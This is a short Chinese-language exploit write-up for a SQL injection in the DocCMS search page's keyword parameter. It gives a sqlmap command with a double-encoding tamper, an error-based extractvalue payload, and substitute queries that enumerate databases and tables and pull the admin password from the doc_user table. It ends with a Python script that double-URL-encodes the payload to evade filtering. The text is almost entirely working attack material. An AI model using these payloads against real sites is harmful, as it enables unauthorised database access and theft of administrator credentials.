```
sqlmap -u https://...../search/index.php?keyword=1 --tamper chardoubleencode
```

漏洞验证：`paylaod = "' and (extractvalue(1,concat(0x7e,(select user()),0x7e)))#"`

SQL注入其他数据，只需要替换上面的`select user()`即可，比如：

- 读取 mysql 中的第1个数据库名称：

```
SELECT schema_name FROM information_schema.SCHEMATA LIMIT 1 OFFSET 0 
```

- 读取 doccms 数据库中的第2张表的表名：

```
SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA = 'doccms' LIMIT 1 OFFSET 1 
```

- 读取doccms数据库doc\_user表中的admin用户的密码：

```
select pwd from `doccms`.`doc_user` where username = 'admin'
```

可以通过Python，对载荷进行二次URL编码：

```
import binascii

def encode_url(paylaod):
    byte_string = paylaod.encode('utf-8')
    hex_encoded = binascii.hexlify(byte_string)
    percent_encoded = '%'.join([hex_encoded[i:i + 2].decode('utf-8') for i in range(0, len(hex_encoded), 2)])
    return "%" + percent_encoded

def encode_url_2(paylaod):
    payload_encode2 = encode_url(encode_url(paylaod))

    return "1" + payload_encode2

if __name__ == "__main__":
    paylaod = "' and (extractvalue(1,concat(0x7e,(select user()),0x7e)))#"
    encode_payload = encode_url_2(paylaod)
    print("encode_payload={}".format(encode_payload))
```
